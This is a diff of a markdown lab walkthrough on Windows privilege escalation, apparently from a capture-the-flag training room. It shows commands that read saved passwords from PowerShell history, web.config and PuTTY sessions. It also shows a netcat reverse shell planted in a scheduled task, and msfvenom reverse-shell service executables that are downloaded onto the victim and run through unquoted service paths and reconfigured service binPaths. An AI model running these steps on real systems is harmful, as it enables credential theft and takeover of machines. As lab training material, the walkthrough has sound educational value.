@@ -14,7 +14,7 @@
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 **A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db\_admin user?**
 
@@ -24,7 +24,7 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 **There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**
 
@@ -45,7 +45,7 @@ runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 ## Other Quick Wins
 
@@ -57,7 +57,7 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 schtasks /query /tn vulntask /fo list /v
 ```
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd)**
 
@@ -71,7 +71,7 @@ icacls c:\tasks\schtask.bat
 icacls c:\tasks\schtask.bat
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -86,11 +86,13 @@ echo c:\tools\nc64.exe -e cmd.exe $KALI 4444 > C:\tasks\schtask.bat
 schtasks /run /tn vulntask
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 ## Abusing Service Misconfigurations
 
+### Insecure Permissions on Service Executable
 
+**Get the flag on svcusr1's desktop**
 
 **Victim(cmd)**
 
@@ -98,7 +100,7 @@ schtasks /run /tn vulntask
 sc qc WindowsScheduler
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd)**
 
@@ -106,7 +108,7 @@ sc qc WindowsScheduler
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -155,42 +157,92 @@ sc start windowsscheduler
 
 ```
 sc.exe stop windowsscheduler
-sc.exe  start windowsscheduler
+sc.exe start windowsscheduler
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+### Unquoted Service Paths
+
+
 
 ****
 
-****
+**Victim(cmd)**
+
+```
+ sc qc "disk sorter enterprise"
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4446 -f exe-service -o rev-svc2.exe
+python2 -m SimpleHTTPServer 81
+```
 
 **Victim(Powershell)**
 
 ```
-c
+wget http://10.10.15.215:81/rev-svc2.exe -O rev-svc2.exe
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 ```
 
+**Kali**
 
+```
+nc -lvp 4446
+```
 
+**Victim(cmd)**
 
+```
+sc.exe stop "disk sorter enterprise"
+sc.exe start "disk sorter enterprise"
+```
 
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
+### Insecure Service Permissions
 
+**Victim(cmd)**
 
+```
+cd C:\tools\AccessChk
+accesschk64.exe -qlc thmservice
+```
 
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
+**Kali**
 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4447 -f exe-service -o rev-svc3.exe
+python2 -m SimpleHTTPServer 81
+```
 
+**Victim(Powershell)**
 
+```
+wget http://10.10.15.215:81/rev-svc3.exe -O rev-svc3.exe
+```
 
+**Kali**
 
+```
+nc -lvp 4447
+```
 
+**Victim(Powershell)**
 
+```
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+sc.exe stop THMService
+sc.exe start THMService
+```
 
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
